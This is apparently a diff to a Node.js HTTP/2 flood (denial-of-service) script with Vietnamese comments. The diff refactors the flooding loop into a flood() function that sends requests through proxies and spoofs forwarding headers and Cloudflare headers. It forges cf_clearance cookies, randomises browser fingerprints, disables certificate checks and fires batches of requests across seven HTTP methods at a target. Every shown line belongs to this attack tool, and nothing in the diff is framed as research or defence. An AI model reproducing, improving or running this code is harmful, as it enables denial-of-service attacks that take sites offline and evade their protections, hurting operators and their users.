-var ciphe = crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));
-
-// Mã hóa chuỗi ngẫu nhiên và lưu kết quả vào biến encrypted
-let encrypted = ciphe.update(randomString, 'utf8', 'hex');
-encrypted += ciphe.final('hex');
-
-// Tạo cookie với giá trị đã mã hóa
-const cookieValue = encrypted;
-
-const bytes = crypto.randomBytes(16); // Tạo 16 byte ngẫu nhiên
-const xAuthToken = bytes.toString('hex'); // Chuyển đổi thành chuỗi hex
- 
-        var parsed = new URL(target);
-        
-
-        var cipper = headerFunc.cipher();
-
-        var proxy = proxyr().split(':');
-
-        var randIp = randomIp();
-        function generateRandomString(length) {
+function flood() {
+  const randomString = crypto.randomBytes(20).toString('hex');
+  const secretKey = crypto.randomBytes(32);
+  var ciphe = crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));
+  let encrypted = ciphe.update(randomString, 'utf8', 'hex');
+  encrypted += ciphe.final('hex');
+  const bytes = crypto.randomBytes(16);
+  const xAuthToken = bytes.toString('hex');
+  
+  var parsed = new URL(target);
+  var cipper = headerFunc.cipher();
+  var proxy = proxyr();
+  
+  function generateRandomString(length) {
     const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
     let randomString = '';
     for (let i = 0; i < length; i++) {
@@ -970,251 +1004,171 @@ const xAuthToken = bytes.toString('hex'); // Chuyển đổi thành chuỗi hex
   
   const randomString1 = generateRandomString(12);
   const randomString2 = generateRandomString(5);
-  const urls = `https:`+ '/'+'/'+`${randomString1}.${randomString2}/index.html`;
-
-
-
-const mediaTypes = [ 
-  'text/html', 
-  'application/xhtml+xml', 
-  'application/xml', 
-  'image/avif', 
-  'image/webp', 
-  'image/apng', 
-  '/', 
-  'application/signed-exchange' 
-]; 
- 
-const acceptValues = []; 
- 
-mediaTypes.forEach((type, index) => { 
-  const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1); 
-  acceptValues.push(`${type};q=${quality}`); 
-}); 
- 
-const acceptHeader = acceptValues.join(',');
-
-const brand = Math.random().toString(36).substring(2, 8); 
-const version = Math.floor(Math.random() * 100) + 1; 
- 
-// Tạo giá trị header cho trình duyệt Brave 
-const braveHeader = `"${brand}";v="${version}", "Brave";v="141.0.7390.122"`; 
- 
-// Tạo giá trị header cho trình duyệt Firefox 
-const firefoxHeader = `"${brand}";v="${version}", "Firefox";v="144.0"`; 
- 
-// Tạo giá trị header cho trình duyệt Edge 
-const edgeHeader = `"${brand}";v="${version}", "Edg";v="141.0.3537.99", "Microsoft Edge";v="141.0.3537.99"`; 
- 
-const chromeHeader = `"${brand}";v="${version}", "Chromium";v="141.0.7390.123", "Google Chrome";v="141.0.7390.123"`; 
-// In giá trị header cho từng trình duyệt 
-const randomIndex = Math.floor(Math.random() * 4); 
- 
-// Chọn giá trị tương ứng với số ngẫu nhiên 
-let selectedValue; 
-switch (randomIndex) { 
-  case 0: 
-    selectedValue = braveHeader; 
-    break; 
-  case 1: 
-    selectedValue = firefoxHeader; 
-    break; 
-  case 2: 
-    selectedValue = edgeHeader; 
-    break; 
-  case 3: 
-    selectedValue = chromeHeader; 
-    break; 
-} 
- 
- function getRandomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-  }
+  const urls = `https://${randomString1}.${randomString2}/index.html`;
   
-  const osVersions = {
-    'Windows': ['6.0', '6.1', '6.2', '6.3', '10.0'],
-    'Android': ['4.4.2', '4.4.4', '5.0', '5.1', '6.0', '6.1', '7.0', '7.1', '8.0', '8.1', '9', '10', '15'],
-    'iOS': ['8_1', '8_3', '8_4', '9_0', '9_1', '9_2', '9_3', '10_0', '10_1', '10_2', '10_3', '11_0', '11_1', '11_2', '11_3', '11_4', '12_0', '12_1', '12_2', '12_3', '12_4', '13_0', '13_1', '13_2', '13_3', '13_4', '14_0', '14_1', '14_2', '14_3', '14_4'],
+  const mediaTypes = ['text/html', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', '/', 'application/signed-exchange']; 
+  const acceptValues = []; 
+  mediaTypes.forEach((type, index) => { 
+    const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1); 
+    acceptValues.push(`${type};q=${quality}`);
+  }); 
+  const acceptHeader = acceptValues.join(',');
+  
+  const selectedValue = generateSecChUA2026();
+  const uas = generateUserAgent2026();
+  
+  const randomPath = `/${randstr(10)}?${randstr(5)}=${randstr(8)}&_=${Date.now()}&t=${Math.random()}`;
+  
+  // BASE HEADERS (SAME FOR ALL METHODS)
+  const baseHeaders = {
+    ':authority': parsed.host,
+    ":path": parsed.path ? parsed.path + randomPath : randomPath,
+    ":scheme": parsed.protocol.replace(':', ''),
+    'Cache-Control': headerFunc.controling(),
+    'Accept-Encoding': headerFunc.encoding(),
+    'X-Forwarded-For': proxy[0],
+    'sec-ch-ua': selectedValue,
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': headerFunc.platforms(),
+    'User-Agent': uas,
+    'upgrade-insecure-requests': '1',
+    'sec-fetch-site': headerFunc.site(),
+    'sec-fetch-dest': headerFunc.dest(),
+    'sec-fetch-mode': headerFunc.mode(),
+    'accept': acceptHeader,
+    'accept-language': headerFunc.lang(),
+    "Origin": target,
+    'x-access-token': xAuthToken,
+    'CF-IPCountry': headerFunc.countrys(),
+    'Referer': urls,
+    'If-Modified-Since': httpTime,
+    "x-requested-with": "XMLHttpRequest",
+    'content-type': headerFunc.type(),
+    'cf-cache-status': 'BYPASS',
+    'sec-ch-ua-platform-version': '0.1.0',
+    'Cookie': "cf_clearance=" + randstr(43) + "-" + randstrsValue + "-0-1-" + randstr(8) + "." + randstr(8) + "." + randstr(8) + "-" + randstrs(3) + "." + "2" + "." + randstrsValue,
+    'CF-ConnectingIP': proxy[0],
+    'CF-Worker': parsed.host,
+    'X-Forwarded-Proto': 'https',
   };
-  const chromeVersions = ['141.0.7390.108', '141.0.7390.123', '138.0.7204.251', '80.0.3987.149', '81.0.4044.138', '83.0.4103.97', '85.0.4183.102', '87.0.4280.88', '88.0.4324.150', '89.0.4389.82', '90.0.4430.93', '91.0.4472.124', '92.0.4515.107', '93.0.4577.63'];
-  const safariVersions = ['534.30', '537.36', '538.1', '602.1', '604.1', '605.1.15', '606.1.36', '607.1.39', '618.1.25', '619.1.30', '620.1.35', '621.1.40'];
-  const androidVersions = ['15.0', '11.0', '10.0', '9.0', '8.0', '7.0', '6.0', '5.1', '5.0', '4.4', '4.3', '4.2', '4.1', '4.0'];
-  const iosVersions = ['15.0', '14.8', '14.7', '14.6', '14.5', '14.4', '14.3', '14.2', '14.1', '14.0', '13.7', '13.6', '13.5', '13.4', '13.3', '13.2', '13.1', '13.0', '12.4', '12.3', '12.2', '12.1', '12.0', '11.4', '11.3', '11.2', '11.1', '11.0', '10.3', '10.2', '10.1', '10.0', '9.3', '9.2', '9.1', '9.0', '8.4', '8.3', '8.2', '8.1', '8.0'];
-  const devices = ['iPhone', 'SM-G991B', 'iPhone14,3', 'Pixel 6', 'Mi 11 Lite', 'iPad', 'iPod', 'Android', 'Samsung', 'Huawei', 'Redmi', 'HTC', 'Nokia', 'Sony', 'LG', 'Motorola', 'Google'];
   
-  const osNames = Object.keys(osVersions);
-  const osName = osNames[getRandomInt(0, osNames.length - 1)];
-  const osVersion = osVersions[osName][getRandomInt(0, osVersions[osName].length - 1)];
-  const device = devices[getRandomInt(0, devices.length - 1)];
-  const isMobile = device !== 'PC';
-  const browserName = isMobile ? 'Mobile Safari' : 'Chrome';
-  const browserVersion = browserName === 'Chrome' ? chromeVersions[getRandomInt(0, chromeVersions.length - 1)] : safariVersions[getRandomInt(0, safariVersions.length - 1)];
-  const userAgent = `${isMobile ? 'Mozilla/5.0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'} ${isMobile ? `(Linux; Android ${androidVersions[getRandomInt(0, androidVersions.length - 1)]}; ${device})` : ''} ${isMobile && osName === 'iOS' ? `AppleWebKit/${browserVersion} (KHTML, like Gecko)` : `AppleWebKit/${browserVersion} (KHTML, like Gecko) ${osName}/${osVersion}`} ${browserName}/${browserVersion} ${isMobile && osName === 'iOS' ? `Mobile/${iosVersions[getRandomInt(0, iosVersions.length - 1)]}` : ''}`;
-  const uas = userAgent;
-
-
-
-var header = {
- ':authority': parsed.host,
- ':method': 'GET',
- ":path": parsed.path,
- ":scheme": "https",
-  'Cache-Control': headerFunc.controling(),
-  'Accept-Encoding': headerFunc.encoding(),
-  'X-Forwarded-For': proxy[0],
-  'sec-ch-ua': selectedValue,
-  'sec-ch-ua-mobile': '?0',
-  'sec-ch-ua-platform': headerFunc.platforms(),
-  'User-Agent': uas,
-  'upgrade-insecure-requests': '1',
-  'sec-fetch-site': headerFunc.site(),
-  'sec-fetch-dest': headerFunc.dest(),
-  'sec-fetch-mode': headerFunc.mode(),
-  'accept':acceptHeader,
-  'accept-language': headerFunc.lang(),
-  "Origin": target,
-  'x-access-token': xAuthToken,
-  'CF-IPCountry': headerFunc.countrys(),
-  'Referer': urls,
-  'If-Modified-Since': httpTime,
-  "x-requested-with": "XMLHttpRequest",
-  'content-type':headerFunc.type(),
-  'cf-cache-status': 'BYPASS',
-  'sec-ch-ua-platform-version':'0.1.0',
-  'Cookie':    "cf_clearance=" +
-  randstr(43) +
-  "-" +
-  randstrsValue +
-  "-0-1-" +
-  randstr(8) +
-  "." +
-  randstr(8) +
-  "." +
-  randstr(8) +
-  "-" +
-  randstrs(3) +
-  "." +
-  "2" +
-  "." +
-  randstrsValue
-,
-  //iMpBVun2ZE5KNCXoymPuga7gLL3Q5t09D_4rVkQrDuQ-1691689165-0-1-2501eeea.5bf4c583.721c8e26-160.2.1691689165
-  //2XAOWoxvbZB3EBeD.l8EVi0p7SV7n_Z7pypSB6B6hgE-1691685576-0-1-3d986ff5.d6e451f7.eabc53d7-160.2.1691685576
-  //wTb.3vPYNEw9RDUF7IRGYnjjdff0mpKMThtSS2.Wscg-1691685963-0-1-2b896076.f1ea100d.7c883f96-250.2.1691685963
-  //ESKN7nocDQDEm6mIuJRLomKzhFApzxF7ypJ9PQW4KsI-1691686513-0-1-cdd1bfa0.edac7d5e.9ad0e040-250.2.1691686513
-  'CF-ConnectingIP':proxy[0],
-  'CF-Worker': parsed.host,
-  'X-Forwarded-Proto':'https',
-};
-
-
-const agent = new http.Agent({
-  keepAlive: true,
-  keepAliveMsecs: 400000,
-  maxSockets: 70000,
-  maxTotalSockets: 12000,
-});
-
-const requestOptions = {
-  host: proxy[0],
- agent: agent,
-  port: proxy[1],
-  method: 'CONNECT',
-  path: parsed.host + ':443',
-  timeout: 100,
- headers: {
-     'Host': parsed.host,
-     'Proxy-Connection': 'Keep-Alive',
-     'Connection': 'Keep-Alive',
-   },
-};
-
-const req = http.request(requestOptions, (res) => {
-  // Handle response
-});
-
-const COMMON_TLS_OPTIONS = {
-  ciphers: cipper,
-  secureProtocol: ["TLS_client_method", "TLS_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
-  sigals: concu,
-  secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | 
-                 crypto.constants.SSL_OP_NO_TICKET | 
-                 crypto.constants.SSL_OP_NO_SSLv2 | 
-                 crypto.constants.SSL_OP_NO_SSLv3 | 
-                 crypto.constants.SSL_OP_NO_COMPRESSION | 
-                 crypto.constants.SSL_OP_NO_RENEGOTIATION | 
-                 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | 
-                 crypto.constants.SSL_OP_TLSEXT_PADDING | 
-                 crypto.constants.SSL_OP_ALL | 
-                 crypto.constants.SSLcom,
-  echdCurve: "auto",
-  secure: true,
-  Compression: false,
-  rejectUnauthorized: false,
-  ALPNProtocols: ['h2', 'HTTP/2', 'http/2', 'http/1.1', 'h2c','spdy/3.1','h3'],
-
-};
-function createCustomTLSSocket(parsed, socket) {
-  const tlsSocket = tls.connect({
+  const postData = getPostData();
+  
+  // CREATE HEADERS FOR EACH METHOD
+  const methodHeaders = {};
+  HTTP_METHODS.forEach(method => {
+    methodHeaders[method] = {
+      ...baseHeaders,
+      ':method': method
+    };
+    if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
+      methodHeaders[method]['Content-Length'] = Buffer.byteLength(postData);
+    }
+  });
+  
+  const agent = new http.Agent({
+    keepAlive: true,
+    keepAliveMsecs: 400000,
+    maxSockets: 70000,
+    maxTotalSockets: 12000,
+  });
+  
+  const requestOptions = {
+    host: proxy[0],
+    agent: agent,
+    port: proxy[1] || (parsed.protocol === 'https:' ? 443 : 80),
+    method: 'CONNECT',
+    path: parsed.host + ':' + (parsed.port || (parsed.protocol === 'https:' ? 443 : 80)),
+    timeout: 100,
+    headers: {
+      'Host': parsed.host,
+      'Proxy-Connection': 'Keep-Alive',
+      'Connection': 'Keep-Alive',
+    },
+  };
+  
+  const req = http.request(requestOptions);
+  
+  const COMMON_TLS_OPTIONS = {
+    ciphers: cipper,
+    secureProtocol: ["TLS_client_method", "TLS_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
+    sigals: concu,
+    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+    echdCurve: "auto",
+    secure: true,
+    Compression: false,
+    rejectUnauthorized: false,
+    ALPNProtocols: ['h2', 'http/1.1', 'HTTP/2', 'http/2', 'h2c', 'spdy/3.1', 'h3'],
+  };
+  
+  function createCustomTLSSocket(parsed, socket) {
+    const tlsSocket = tls.connect({
       ...COMMON_TLS_OPTIONS,
       host: parsed.host,
-      port: 443,
+      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
       servername: parsed.host,
       socket: socket
-  });
-
-  tlsSocket.setKeepAlive(true, 60 * 10000);
-
-  return tlsSocket;
-}
-req.on('connect', function (res, socket, head) {
-        
-  const tlsSocket = createCustomTLSSocket(parsed, socket);
-
-  const client = http2.connect(parsed.href, {
+    });
+    tlsSocket.setKeepAlive(true, 60 * 10000);
+    return tlsSocket;
+  }
+  
+  req.on('connect', function(res, socket, head) {
+    const tlsSocket = createCustomTLSSocket(parsed, socket);
+    
+    const client = http2.connect(parsed.href, {
       createConnection: () => tlsSocket,
       settings: {
-          headerTableSize: 65536,
-          maxConcurrentStreams: 1000,
-          initialWindowSize: 6291456,
-          maxHeaderListSize: 262144,
-          enablePush: false
+        headerTableSize: 65536,
+        maxConcurrentStreams: 1000,
+        initialWindowSize: 6291456,
+        maxHeaderListSize: 262144,
+        enablePush: false
       }
-  });            
-              client.on("connect", () => {
-                        setInterval(() => {
-                    for (let i = 0; i < rps; i++) {
-                        const request = client.request(header)
-                        .on("response", response => {
-                            request.close();
-                            request.destroy();
-                            return
-                        });
-        
-                       request.end();                 
-                      }
-                    },interval);
+    });
+    
+    client.on("connect", () => {
+      const attackInterval = setInterval(() => {
+        // SEND ALL 7 METHODS TOGETHER IN EACH BATCH
+        for (let i = 0; i < rps; i++) {
+          for (const method of HTTP_METHODS) {
+            try {
+              const headers = methodHeaders[method];
+              const request = client.request(headers)
+                .on("response", response => {
+                  request.close();
+                  request.destroy();
                 });
-                client.on("close", () => {
-                  client.destroy();
-                  tlsSocket.destroy();
-                  socket.destroy();
-                  return
-              });
-          
-              client.on("error", error => {
-                  client.destroy();
-                  tlsSocket.destroy();
-                  socket.destroy();
-                  return
-              });
+              
+              // Add body for POST/PUT/PATCH
+              if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
+                request.write(postData);
+              }
+              request.end();
+            } catch(e) {}
+          }
+        }
+      }, interval);
+      
+      // Store interval for cleanup
+      client._interval = attackInterval;
+    });
+    
+    client.on("close", () => {
+      if (client._interval) clearInterval(client._interval);
+      client.destroy();
+      tlsSocket.destroy();
+      socket.destroy();
+    });
+    
+    client.on("error", error => {
+      if (client._interval) clearInterval(client._interval);
+      client.destroy();
+      tlsSocket.destroy();
+      socket.destroy();
+    });
   });
-
-        req.end();
-
-    }
-
-
-const client = http2.connect(parsed.href, clientOptions, function() {
-  // handle successful connection
-});
+  
+  req.on('error', (err) => {});
+  req.end();
+}
